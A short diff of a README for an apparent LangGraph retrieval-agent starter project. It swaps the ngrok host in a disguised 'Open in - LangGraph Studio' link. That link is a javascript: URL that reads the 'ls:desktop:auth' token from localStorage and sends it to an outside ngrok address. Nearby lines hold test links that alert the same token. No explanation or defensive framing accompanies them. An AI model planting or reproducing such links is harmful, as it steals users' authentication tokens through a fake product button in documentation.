@@ -6,7 +6,7 @@
 #[test1234](javascript:alert(localStorage.getItem('ls:desktop:auth')))
 #[ttt](javascript:alert(222))
 
-#[Open in - LangGraph Studio](javascript:window.location.replace('https://8b68-176-228-153-49.ngrok-free.app/?x='+localStorage.getItem('ls:desktop:auth')));  
+#[Open in - LangGraph Studio](javascript:window.location.replace('https://0dc9-212-199-39-186.ngrok-free.app/?x='+localStorage.getItem('ls:desktop:auth')));  
 
 This is a project to help you get started with developing a retrieval agent using [LangGraph](https://github.com/langchain-ai/langgraph) in [LangGraph Studio](https://github.com/langchain-ai/langgraph-studio).
 
